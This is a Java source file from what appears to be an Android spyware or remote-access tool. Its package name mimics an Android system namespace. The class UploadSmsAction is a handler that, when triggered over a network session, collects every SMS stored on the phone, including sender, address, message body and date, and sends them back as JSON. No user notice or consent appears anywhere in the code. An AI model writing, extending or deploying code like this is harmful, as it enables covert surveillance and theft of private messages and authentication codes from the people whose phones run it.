package com.android.sys.action;

import com.android.sys.service.SystemService;
import com.android.sys.session.NetworkSessionManager;
import com.android.sys.utils.DataPack;
import com.android.sys.utils.SystemUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.util.List;

public class UploadSmsAction implements NetworkSessionManager.ActionHandler {
    @Override
    public void handleAction(String actionName, InputStream inputStream, OutputStream outputStream) {
        List<SystemUtil.SmsData> smsList = SystemUtil.getSmsInPhone(SystemService.getContext());
        if(smsList == null) {
            return;
        }
        JSONObject responseJsonObject = new JSONObject();
        try {
            JSONArray smsArray = new JSONArray();
            for(SystemUtil.SmsData smsData: smsList) {
                JSONObject smsJsonObject = new JSONObject();
                smsJsonObject.put("person", smsData.person);
                smsJsonObject.put("address", smsData.address);
                smsJsonObject.put("body", smsData.body);
                smsJsonObject.put("date", smsData.date);
                smsJsonObject.put("type", smsData.type);
                smsArray.put(smsJsonObject);
            }
            responseJsonObject.put(actionName, smsArray);
        } catch (JSONException e) {
        }
        byte[] responseData = null;
        try {
            responseData = responseJsonObject.toString().getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
            responseData = responseJsonObject.toString().getBytes();
        }
        DataPack.sendDataPack(outputStream, responseData);
    }
}
